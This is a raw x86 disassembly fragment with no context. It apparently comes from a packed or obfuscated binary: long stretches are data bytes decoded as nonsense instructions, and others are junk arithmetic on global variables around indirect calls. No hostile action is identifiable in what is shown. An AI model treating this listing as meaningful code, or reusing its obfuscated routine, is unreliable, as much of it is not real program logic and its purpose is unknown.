  41868a:	dec    ebx
  41868b:	dec    ecx
  41868c:	mov    ebx,0x2449b3ab
  418691:	int    0xba
  418693:	fidivr WORD PTR [edx+0x7a]
  418696:	adc    al,0xe8
  418698:	lea    edi,[eax-0x70876df0]
  41869e:	dec    esi
  41869f:	push   0x362855ad
  4186a4:	outs   dx,DWORD PTR ds:[esi]
  4186a5:	mov    esp,0xc6673f13
  4186aa:	push   ebp
  4186ab:	push   eax
  4186ac:	in     eax,0x18
  4186ae:	je     0x418727
  4186b0:	sbb    ebx,ebp
  4186b2:	sbb    BYTE PTR [ebp-0x6efab671],al
  4186b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186b9:	adc    eax,ebx
  4186bb:	arpl   WORD PTR [edi+0x4f],dx
  4186be:	sbb    BYTE PTR [esi-0x71d073],bh
  4186c4:	nop
  4186c5:	mov    al,ds:0x1b8e15d1
  4186ca:	icebp  
  4186cb:	popa   
  4186cc:	imul   edi,DWORD PTR [ebp-0x24],0x6e2e52fe
  4186d3:	jmp    FWORD PTR ds:0xa3b10a5f
  4186d9:	out    0x96,eax
  4186db:	or     BYTE PTR fs:[ebx-0x45],dl
  4186df:	add    DWORD PTR [edx-0x80],esi
  4186e2:	popa   
  4186e3:	xchg   BYTE PTR [edi],al
  4186e5:	clc    
  4186e6:	pop    eax
  4186e7:	or     BYTE PTR ds:0xa5635ffe,0xb6
  4186ee:	add    dh,BYTE PTR [esi-0x26]
  4186f1:	add    BYTE PTR [ebp-0x5c],0xe7
  4186f5:	push   ds
  4186f6:	mov    db5,esp
  4186f9:	cmc    
  4186fa:	xor    eax,DWORD PTR [esi-0x5d9a188e]
  418700:	je     0x4186e8
  418702:	repnz mov ch,0x51
  418705:	fmul   QWORD PTR [ebx+0x52]
  418708:	hlt    
  418709:	and    al,0x57
  41870b:	xchg   ecx,eax
  41870c:	repz sub BYTE PTR [edx+0xb],bh
  418710:	xor    BYTE PTR [ecx+0x2bcb6f8],ah
  418716:	inc    esp
  418717:	push   cs
  418718:	push   edi
  418719:	sub    BYTE PTR [ebp+0x532d20d0],al
  41871f:	mov    edx,0x941d72fa
  418724:	mov    ebp,0xc681d955
  418729:	xor    eax,0x6dd0ad17
  41872e:	fdiv   QWORD PTR [ebp+0x7a]
  418731:	test   eax,0x348fb8ed
  418736:	dec    ebp
  418737:	adc    ecx,ebp
  418739:	mov    bl,0x44
  41873b:	pop    esp
  41873c:	sub    al,0x1c
  41873e:	adc    BYTE PTR [edi+0x5852b738],bl
  418744:	push   ss
  418745:	in     al,0x1e
  418747:	xchg   ebp,eax
  418748:	popa   
  418749:	or     dh,BYTE PTR ds:0xc8cf5616
  41874f:	or     eax,0xcaeec49b
  418754:	dec    DWORD PTR [esi+0x582670db]
  41875a:	dec    esi
  41875b:	mov    ecx,0x2913f140
  418760:	enter  0x8cbd,0xca
  418764:	lds    edx,FWORD PTR [ebp+0x37051301]
  41876a:	adc    eax,0x2d224741
  41876f:	push   ebx
  418770:	pop    esp
  418771:	xor    eax,0xfa5dd708
  418777:	add    ecx,DWORD PTR [edi]
  418779:	jns    0x41870e
  41877b:	popf   
  41877c:	add    BYTE PTR [ebp+eiz*8+0x50bcb9a4],0x2e
  418784:	lods   al,BYTE PTR ds:[esi]
  418785:	stc    
  418786:	test   eax,0x846c6cdc
  41878b:	fcomp  DWORD PTR [edx+0xa]
  41878e:	mov    dl,0x68
  418790:	scas   eax,DWORD PTR es:[edi]
  418791:	enter  0x78f3,0x3d
  418795:	jno    0x418727
  418797:	or     BYTE PTR [edi],al
  418799:	mov    ds:0xf8829651,al
  41879e:	jmp    0x41881a
  4187a0:	das    
  4187a1:	dec    edi
  4187a2:	call   0x634249f9
  4187a7:	pop    eax
  4187a8:	pop    esp
  4187a9:	mov    ebx,0x19c63eb0
  4187ae:	loop   0x418818
  4187b0:	and    bh,BYTE PTR [edx-0x61cc8604]
  4187b6:	inc    esi
  4187b7:	cmp    dh,BYTE PTR [ecx]
  4187b9:	xor    eax,0x917b5d94
  4187be:	mov    ch,0xa3
  4187c0:	ret    
  4187c1:	jns    0x41874a
  4187c3:	mov    al,0x88
  4187c5:	or     al,BYTE PTR [edx-0x64496fbd]
  4187cb:	addr16 inc esp
  4187cd:	jne    0x41876c
  4187cf:	push   edi
  4187d0:	xchg   BYTE PTR [eax+0x70],dl
  4187d3:	mov    ebx,0x235dc74a
  4187d8:	jo     0x4187f5
  4187da:	push   eax
  4187db:	sbb    DWORD PTR [edx+0x3b],esi
  4187de:	adc    BYTE PTR [esi-0x53],0x4c
  4187e2:	div    DWORD PTR [eax-0x5c]
  4187e5:	cmp    DWORD PTR [ebx+0xe],edi
  4187e8:	es push edi
  4187ea:	rcr    BYTE PTR [esi+0x7e],cl
  4187ed:	adc    DWORD PTR [eax],esp
  4187ef:	mov    dh,0xaa
  4187f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187f2:	mov    bh,0xbb
  4187f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187f5:	mov    esp,0xc231745d
  4187fa:	out    0x49,eax
  4187fc:	add    bh,al
  4187fe:	int3   
  4187ff:	data16 and bl,BYTE PTR [esi]
  418802:	shl    DWORD PTR [edi+0x646fcdef],1
  418808:	(bad)  
  418809:	scas   eax,DWORD PTR es:[edi]
  41880a:	or     ecx,0xffffff87
  41880d:	fimul  DWORD PTR [esi]
  41880f:	mov    dl,0xd7
  418811:	popa   
  418812:	mov    ecx,0x156a7f90
  418817:	lods   eax,DWORD PTR ds:[esi]
  418818:	sbb    ah,BYTE PTR [ecx-0x4a]
  41881b:	dec    ebp
  41881c:	daa    
  41881d:	push   ebp
  41881e:	retf   0xfb74
  418821:	ret    0x5b5
  418824:	xchg   esi,eax
  418825:	add    al,0xf2
  418827:	mov    ds:0x6c4b6cf7,al
  41882c:	cdq    
  41882d:	xor    al,BYTE PTR [eax+0x6400a517]
  418833:	and    edi,DWORD PTR [esp+esi*8-0xfe253b5]
  41883a:	shl    DWORD PTR [ebx],cl
  41883c:	mov    bl,0xb3
  41883e:	or     DWORD PTR cs:[esi-0x29],ebx
  418842:	(bad)  
  418843:	pusha  
  418844:	out    dx,al
  418845:	inc    esp
  418846:	sbb    esp,DWORD PTR [ebx]
  418848:	test   al,0xb
  41884a:	or     eax,0xbe1509de
  41884f:	test   al,0xd3
  418851:	mov    eax,gs
  418853:	mov    ebx,0xc76ec479
  418858:	jmp    0x6ed1:0xf7b0b322
  41885f:	int3   
  418860:	mov    eax,0x4b6156aa
  418865:	loop   0x418803
  418867:	mov    ah,0xbf
  418869:	add    al,0x8f
  41886b:	clc    
  41886c:	fcomp  QWORD PTR [eax]
  41886e:	inc    esp
  41886f:	daa    
  418870:	mov    fs,WORD PTR [eax-0x48]
  418873:	cmp    DWORD PTR ds:0xc10cbc37,ecx
  418879:	jmp    0x3ec1ee80
  41887e:	inc    ecx
  41887f:	pop    ebp
  418880:	in     eax,0xb7
  418882:	mov    edx,0x5aff0065
  418887:	jg     0x418825
  418889:	adc    edx,DWORD PTR [edx-0x73a5beb1]
  41888f:	xchg   ebp,eax
  418890:	mov    ds:0x2fb1d998,eax
  418895:	cmp    eax,0xb3b21e70
  41889a:	clc    
  41889b:	es jae 0x41885c
  41889e:	test   DWORD PTR [edi],esp
  4188a0:	xchg   DWORD PTR [edi-0x67],ebp
  4188a3:	lock adc al,0xf4
  4188a6:	jecxz  0x41882e
  4188a8:	retf   0xa614
  4188ab:	or     al,0x5b
  4188ad:	fisttp WORD PTR [esi]
  4188af:	adc    DWORD PTR [esi],esp
  4188b1:	scas   eax,DWORD PTR es:[edi]
  4188b2:	mov    eax,ds:0x4c8ba8ea
  4188b7:	and    al,0x48
  4188b9:	or     DWORD PTR ds:0x42827b,0x42826b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428193
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428283,0x4282db
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x4281cf,0x4282d3
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42827f,0x4283bf
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x4282bb,0x7154
  418909:	call   DWORD PTR ds:0x428de8
  41890f:	or     DWORD PTR ds:0x4282d3,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x4283d7,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42835f,0x0
  418935:	mov    DWORD PTR ds:0x42833f,ebx
  41893b:	mov    DWORD PTR ds:0x4282c3,ebx
  418941:	mov    esi,DWORD PTR ds:0x428293
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42835f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428e2c
  41896e:	movzx  esi,WORD PTR ds:0x428363
  418975:	sbb    DWORD PTR ds:0x4281a3,esi
  41897b:	adc    DWORD PTR ds:0x4283af,0x5f0e
  418985:	xor    DWORD PTR ds:0x4283e7,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428277
  418991:	xor    esi,DWORD PTR ds:0x4281b3
  418997:	mov    DWORD PTR ds:0x428277,esi
  41899d:	add    DWORD PTR ds:0x428287,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x4283e3,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x4283bb,0x42827b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x4281a3,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42835b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x4282e3
  4189ec:	mov    edx,DWORD PTR ds:0x42826b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x4283e3,0x606f
  418a03:	mov    DWORD PTR ds:0x4281bf,ebx
  418a09:	cmp    DWORD PTR ds:0x42835b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428e30
  418a1c:	adc    DWORD PTR ds:0x42819b,ebx
  418a22:	or     DWORD PTR ds:0x42829f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42824f
  418a34:	mov    edx,DWORD PTR ds:0x428373
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428363
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x4282e7,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x4283e3,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x4282bb,0x11c5
  418a73:	mov    DWORD PTR ds:0x4283d7,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42819b
  418a85:	mov    eax,ds:0x4282db
  418a8a:	cmp    DWORD PTR ds:0x4283e3,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428ed0
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x4283b3,0x4bc8
  418aba:	sub    DWORD PTR ds:0x4282c3,edi
  418ac0:	or     DWORD PTR ds:0x4282bb,0x2abb
  418aca:	sbb    DWORD PTR ds:0x4283af,ebx
  418ad0:	mov    eax,ds:0x422598
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x4281bb,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xe9b0b184
  418af3:	fs jecxz 0x418aa0
  418af6:	call   0x1812:0xbc1816cb
  418afd:	sbb    BYTE PTR [eax+0x4b29472c],al
  418b03:	fisttp QWORD PTR [ebx+edi*4-0x7a]
  418b07:	pushf  
  418b08:	inc    ebp
  418b09:	pusha  
  418b0a:	add    esp,esp
  418b0c:	mov    ecx,0xa935e1dc
  418b11:	xchg   BYTE PTR [ebp+0x8],bh
  418b14:	fcom   QWORD PTR [ebp-0x16f61d04]
  418b1a:	(bad)  
  418b1b:	shl    DWORD PTR [eax],1
  418b1d:	xor    ecx,DWORD PTR [eax]
  418b1f:	ror    BYTE PTR [eax],1
  418b21:	fnstenv [ecx+0x7f0c3e15]
  418b27:	and    DWORD PTR [ebp-0x4af37c83],0x61555924
  418b31:	pop    eax
  418b32:	xor    eax,0x5ce292aa
  418b37:	or     ecx,DWORD PTR [esi-0x55]
  418b3a:	and    BYTE PTR [eax-0xdfd0f13],cl
  418b40:	rcl    BYTE PTR [edx],0x19
  418b43:	test   DWORD PTR [eiz*1+0x4d50378f],esp
  418b4a:	int3   
  418b4b:	(bad)  
  418b4d:	mov    cl,0x51
  418b4f:	(bad)  
  418b50:	lods   al,BYTE PTR ds:[esi]
  418b51:	(bad)  
  418b52:	scas   al,BYTE PTR es:[edi]
  418b53:	test   eax,0x5165e76e
  418b58:	fidivr WORD PTR [esi+0x14]
  418b5b:	mov    edx,DWORD PTR [ebp+0x6acb42d2]
  418b61:	and    eax,ecx
  418b63:	adc    DWORD PTR [esi+0x7c],edx
  418b66:	pop    edx
  418b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b68:	fstp   QWORD PTR [edi-0x780e4981]
  418b6e:	inc    DWORD PTR [esi+0x3a176f9f]
  418b74:	aaa    
  418b75:	dec    edx
  418b76:	ins    DWORD PTR es:[edi],dx
  418b77:	xor    eax,0x52ff8239
  418b7c:	mov    edi,0x45b54225
  418b81:	inc    ebx
  418b82:	stc    
  418b83:	(bad)  
  418b85:	cdq    
  418b86:	cmp    al,0x52
  418b88:	jle    0x418bc5
  418b8a:	imul   ebx,DWORD PTR [esi],0x7f2ab8d2
  418b90:	adc    BYTE PTR [ebx-0x604f40f4],dh
  418b96:	sbb    DWORD PTR gs:[ebp-0x1e],0x37
  418b9b:	out    dx,al
  418b9c:	retf   0xf98a
  418b9f:	sub    eax,0xa4427d71
  418ba4:	xchg   esi,eax
  418ba5:	arpl   WORD PTR [edx],di
  418ba7:	jge    0x418bb3
  418ba9:	mul    BYTE PTR [edx-0x9d3f2e2]
  418baf:	popa   
  418bb0:	jnp    0x418c09
  418bb2:	mov    edx,0x4430a6d2
  418bb7:	dec    esp
  418bb8:	pop    eax
  418bb9:	nop
  418bba:	cmp    al,0x69
  418bbc:	iret   
  418bbd:	inc    esi
  418bbe:	inc    ecx
  418bbf:	neg    DWORD PTR [eax-0x5694152a]
  418bc5:	or     al,0xa6
  418bc7:	mov    ah,BYTE PTR [ebp-0x22]
  418bca:	cs stos DWORD PTR es:[edi],eax
  418bcc:	pop    es
  418bcd:	mov    ds,esi
  418bcf:	mov    ah,al
  418bd1:	aad    0xe6
  418bd3:	repnz push esi
  418bd5:	sbb    eax,0xca6398cb
  418bda:	lea    edx,[ebp+0x4526316b]
  418be0:	jo     0x418c4b
  418be2:	fistp  WORD PTR [eax]
  418be4:	loope  0x418c05
  418be6:	hlt    
  418be7:	fadd   DWORD PTR [ecx+0x2e]
  418bea:	lds    ecx,FWORD PTR [esi]
  418bec:	mov    esp,0x5e13cc7f
  418bf1:	in     eax,dx
  418bf2:	inc    esi
  418bf3:	fnstenv [edi]
  418bf5:	test   al,0x55
  418bf7:	pop    ds
  418bf8:	std    
  418bf9:	pop    esp
  418bfa:	pusha  
  418bfb:	push   es
  418bfc:	inc    edi
  418bfd:	sub    BYTE PTR [ebx-0x30],al
  418c00:	sahf   
  418c01:	pop    ss
  418c02:	data16 jecxz 0x418c18
  418c05:	pushf  
  418c06:	scas   al,BYTE PTR es:[edi]
  418c07:	adc    dh,cl
  418c09:	add    dh,ch
  418c0b:	pop    ebx
  418c0c:	fcom   DWORD PTR [edx-0x65]
  418c0f:	imul   esi,DWORD PTR [eax-0x3b],0xe
  418c13:	pop    ebp
  418c14:	fild   QWORD PTR [esi-0x1014ca1d]
  418c1a:	sbb    DWORD PTR [eax],0xfffffffe
  418c1d:	xor    al,0x41
  418c1f:	sbb    DWORD PTR ds:0x9fc84ff4,ebp
  418c25:	inc    ecx
  418c26:	std    
  418c27:	rol    DWORD PTR [eax-0x4c],0xdc
  418c2b:	push   esi
  418c2c:	fistp  WORD PTR [ecx]
  418c2e:	mov    ebp,0xd820d538
  418c33:	lds    edx,FWORD PTR [ebx+edi*8]
  418c36:	inc    ebx
  418c37:	inc    eax
  418c38:	pop    ebx
  418c39:	push   esi
  418c3a:	mov    ebx,0xf752fc08
  418c3f:	inc    ebp
  418c40:	and    DWORD PTR [edx],esp
  418c42:	jl     0xb8adc2e1
  418c48:	xchg   edx,eax
  418c49:	(bad)  
  418c4a:	and    al,0x2b
  418c4c:	pop    ds
  418c4d:	loop   0x418c35
  418c4f:	add    eax,0xbf590b3d
  418c54:	call   0x470e:0x8978e30d
  418c5b:	push   ss
  418c5c:	pop    ds
  418c5d:	inc    ebp
  418c5e:	lahf   
  418c5f:	sbb    al,0x18
  418c61:	mov    cl,0xb1
  418c63:	pushf  
  418c64:	inc    ebx
  418c65:	pop    esp
  418c66:	xchg   ecx,eax
  418c67:	sub    bl,0xc3
  418c6a:	sub    ebp,esi
  418c6c:	lea    eax,[eax+0x2798ce6]
  418c72:	sbb    cl,BYTE PTR [ebp+esi*1+0x66]
  418c76:	jbe    0x418c12
  418c78:	xor    eax,0x2dc5ad6e
  418c7d:	test   esi,edi
  418c7f:	fst    DWORD PTR [ecx-0x29028866]
  418c85:	cli    
  418c86:	mov    ecx,0x227a9b16
  418c8b:	aaa    
  418c8c:	clc    
  418c8d:	pushf  
  418c8e:	dec    edi
  418c8f:	je     0x418c5b
  418c91:	jp     0x418c49
  418c93:	imul   eax,DWORD PTR [eax-0x3a0bd8db],0x9066fc34
  418c9d:	mov    edx,0xf0f179a5
  418ca2:	jo     0x418c5c
  418ca4:	sar    BYTE PTR [ebx+0xc86a207],0xf5
  418cab:	aas    
  418cac:	hlt    
  418cad:	mov    edx,0x6344a6ea
  418cb2:	int3   
  418cb3:	push   edi
  418cb4:	mov    dh,bh
  418cb6:	sub    DWORD PTR [ebp+0x31d6a1f1],edx
  418cbc:	dec    eax
  418cbd:	fld    st(0)
  418cbf:	inc    edx
  418cc0:	pop    ss
  418cc1:	dec    edx
  418cc2:	std    
  418cc3:	aam    0x82
  418cc5:	repz les ecx,FWORD PTR [ebx]
  418cc8:	dec    esi
  418cc9:	pusha  
  418cca:	mov    edi,esi
  418ccc:	jle    0x418cec
  418cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ccf:	idiv   BYTE PTR [ecx+0x53]
  418cd2:	ja     0x418ce3
  418cd4:	and    eax,0x4e3ed705
  418cd9:	and    BYTE PTR [edi],bl
  418cdb:	daa    
  418cdc:	adc    al,0x98
  418cde:	and    eax,0x96226ffd
  418ce3:	xor    DWORD PTR [edi],ebx
  418ce5:	(bad)  
  418ce6:	in     eax,dx
  418ce7:	(bad)  
  418ce8:	fisttp DWORD PTR [edx]
  418cea:	stos   DWORD PTR es:[edi],eax
  418ceb:	pop    ss
  418cec:	into   
  418ced:	inc    edi
  418cee:	dec    BYTE PTR cs:[esi+eax*8-0x49]
  418cf3:	fldcw  WORD PTR [ecx-0x17e9542e]
  418cf9:	sar    ebx,0x17
  418cfc:	or     bh,BYTE PTR [esp+ebx*1]
  418cff:	cli    
  418d00:	lock and ebp,DWORD PTR [edx+ecx*8]
  418d04:	out    dx,eax
  418d05:	add    dl,dl
  418d07:	icebp  
  418d08:	pop    ss
  418d09:	inc    edx
  418d0a:	cs clc 
  418d0c:	and    eax,0x425c6e07
  418d11:	cli    
  418d12:	dec    esp
  418d13:	mov    bh,0xfa
  418d15:	pop    es
  418d16:	push   ds
  418d17:	add    eax,DWORD PTR [ebp+0x1a]
  418d1a:	add    esi,esp
  418d1c:	repnz daa 
  418d1e:	into   
  418d1f:	add    dl,BYTE PTR [ebx+0x452a9518]
  418d25:	mov    al,0x45
  418d27:	scas   al,BYTE PTR es:[edi]
  418d28:	js     0x418cb3
  418d2a:	pop    esp
  418d2b:	imul   esi,DWORD PTR [ebp+0x5516e6fa],0xc48608ca
  418d35:	stos   BYTE PTR es:[edi],al
  418d36:	jb     0x418d63
  418d38:	ins    DWORD PTR es:[edi],dx
  418d39:	mov    ebp,0x773c1614
  418d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d3f:	fst    DWORD PTR [ecx+edx*2+0x5950e761]
  418d46:	pop    eax
  418d47:	ret    0x69d
  418d4a:	bound  eax,QWORD PTR ds:0x7bfce9a1
  418d50:	es sbb al,0xf0
  418d53:	push   eax
  418d54:	mov    ebx,edx
  418d56:	nop
  418d57:	aam    0xf7
  418d59:	inc    ebx
  418d5a:	jmp    0x418d8f
  418d5c:	adc    DWORD PTR [eax],edi
  418d5e:	ja     0x418d81
  418d60:	mov    edx,DWORD PTR [edx]
  418d62:	int3   
  418d63:	jns    0x418d07
  418d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d66:	and    ebx,DWORD PTR [edi+esi*2-0x4b920acd]
  418d6d:	cmp    DWORD PTR [esi],esi
  418d6f:	jecxz  0x418de9
  418d71:	or     dl,dl
  418d73:	sbb    DWORD PTR [edx+eax*8-0xd195df5],eax
  418d7a:	mov    ?,WORD PTR [edi+ebx*4+0x1b]
  418d7e:	and    ch,BYTE PTR [esi+0x14149478]
  418d84:	or     ecx,DWORD PTR [esi-0x1f]
  418d87:	fwait
  418d88:	dec    esp
  418d89:	adc    edx,0x6a
  418d8c:	add    al,0x86
  418d8e:	mov    ch,0x9d
  418d90:	jmp    0xc6b8:0x177a122b
  418d97:	or     al,0x39
  418d99:	inc    esp
  418d9a:	pop    edx
  418d9b:	sbb    DWORD PTR [esi+0x7d],ecx
  418d9e:	je     0x418df4
  418da0:	add    esp,DWORD PTR [edx]
  418da2:	jbe    0x418d3c
  418da4:	daa    
  418da5:	in     eax,0xac
  418da7:	mov    al,ds:0xa3fa0b89
  418dac:	fcomp  QWORD PTR [ecx+0x2636ea6e]
  418db2:	or     BYTE PTR [ecx-0x27],dl
  418db5:	add    eax,0x83f6c32
  418dba:	imul   eax,DWORD PTR [edx-0x4230f81],0x6e6a71b0
  418dc4:	pop    ecx
  418dc5:	sub    dh,BYTE PTR [ebx]
  418dc7:	pop    eax
  418dc8:	retf   
  418dc9:	les    ecx,FWORD PTR [esi-0x1]
  418dcc:	sub    DWORD PTR [ecx-0x2b33bd0],ecx
  418dd2:	and    DWORD PTR [ebp+0x6a],esi
  418dd5:	mov    al,0x2c
  418dd7:	mov    ebp,0x7042540b
  418ddc:	popa   
  418ddd:	mov    dl,0x11
  418ddf:	push   ebx
  418de0:	cmp    al,0x7d
  418de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418de3:	xor    BYTE PTR [ebp+0x5e],al
  418de6:	xor    eax,0xbb882a37
  418deb:	sub    esi,DWORD PTR [ecx]
  418ded:	sahf   
  418dee:	xchg   esp,eax
  418def:	stos   BYTE PTR es:[edi],al
  418df0:	daa    
  418df1:	ins    DWORD PTR es:[edi],dx
  418df2:	adc    cl,dh
  418df4:	mov    dl,0x7d
  418df6:	fdivr  DWORD PTR [esi+0x1162b1a6]
  418dfc:	mov    ch,0x7f
  418dfe:	aas    
  418dff:	inc    edi
  418e00:	(bad)  
  418e01:	sti    
  418e02:	and    al,0x60
  418e04:	shl    BYTE PTR [eax+ebx*4],cl
  418e07:	push   eax
  418e08:	xchg   edi,eax
  418e09:	xor    dl,cl
  418e0b:	fld    QWORD PTR [edi*8+0x12add242]
  418e12:	es ja  0x418e16
  418e15:	div    BYTE PTR [edx]
  418e17:	and    DWORD PTR [ecx+0x6a],esi
  418e1a:	xlat   BYTE PTR ds:[ebx]
  418e1b:	adc    DWORD PTR [ebx+0x5941983f],ecx
  418e21:	int    0x3a
  418e23:	cli    
  418e24:	mov    cl,0x2
  418e26:	inc    edi
  418e27:	rcl    eax,cl
  418e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e2a:	cmp    eax,0x340cfc2a
  418e2f:	inc    edi
  418e30:	add    al,0xc8
  418e32:	and    DWORD PTR [ebx-0x4b9def11],eax
  418e38:	inc    ebx
  418e39:	mov    edi,0x48085885
  418e3e:	data16 sub BYTE PTR [edi+0x56c1dcc5],al
  418e45:	cmp    al,0x5a
  418e47:	adc    ah,BYTE PTR [eax-0x3b]
  418e4a:	dec    eax
  418e4b:	pop    esi
  418e4c:	lock (bad) 
  418e4e:	or     BYTE PTR [edi-0xf08fa5b],dh
  418e54:	stc    
  418e55:	jmp    0x21900ac3
  418e5a:	jmp    0xab38:0xe4b690db
  418e61:	loopne 0x418e96
  418e63:	rcr    esp,0x74
  418e66:	add    BYTE PTR [esp+esi*8],al
  418e69:	inc    eax
  418e6a:	xchg   esp,eax
  418e6b:	in     al,0xf8
  418e6d:	xor    BYTE PTR [eax+ebp*2+0xd],0xf6
  418e72:	(bad)  fs:[edx+0x37]
  418e76:	jno    0x418e56
  418e78:	out    0x31,eax
  418e7a:	add    esp,DWORD PTR [edi+0x636371c4]
  418e80:	je     0x418efb
  418e82:	jp     0x418ec0
  418e84:	inc    eax
  418e85:	addr16 adc esi,eax
  418e88:	push   edx
  418e89:	push   esi
  418e8a:	or     BYTE PTR [ecx],al
  418e8c:	outs   dx,BYTE PTR ds:[esi]
  418e8d:	sbb    DWORD PTR [ecx-0x46],edi
  418e90:	test   DWORD PTR [esi],0x26552da3
  418e96:	and    DWORD PTR [esi],0x7c
  418e99:	mov    eax,ds:0x5ced60f4
  418e9e:	shl    DWORD PTR [esi+0x3bd88846],1
  418ea4:	cmp    DWORD PTR [ecx+edi*4-0x1d],ecx
  418ea8:	push   esi
  418ea9:	cmp    eax,0xb449108d
  418eae:	xor    cl,BYTE PTR [edx-0x36dcff75]
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x4283df,0x0
  418ec3:	mov    DWORD PTR ds:0x4281a7,0x216c
  418ecd:	mov    DWORD PTR ds:0x4282ab,0x28e7
  418ed7:	mov    DWORD PTR ds:0x4282a3,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x4282b3,0x562c
  418ef0:	mov    DWORD PTR ds:0x4282db,0x3af5
  418efa:	cmp    DWORD PTR ds:0x4283df,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428367
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428e34
  418f1a:	not    DWORD PTR ds:0x4281db
  418f20:	sub    DWORD PTR ds:0x4283cf,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428193
  418f32:	mov    edx,DWORD PTR ds:0x4282d7
  418f38:	sbb    DWORD PTR ds:0x4283bb,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x428313
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42834b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x4283cf,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x4283e3,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x42833b,0x0
  418f6c:	not    DWORD PTR ds:0x4282a7
  418f72:	not    DWORD PTR ds:0x4281d7
  418f78:	mov    DWORD PTR ds:0x42832f,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42835f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x42833b,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x4283bb
  418fb5:	call   DWORD PTR ds:0x428e38
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42826f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x4281cf
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x4283bf,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x4281cb,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x4281af,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42819f,0x0
  41900e:	mov    DWORD PTR ds:0x4281b3,0x4347
  419018:	mov    DWORD PTR ds:0x4281d7,0x6064
  419022:	mov    DWORD PTR ds:0x4282bf,edi
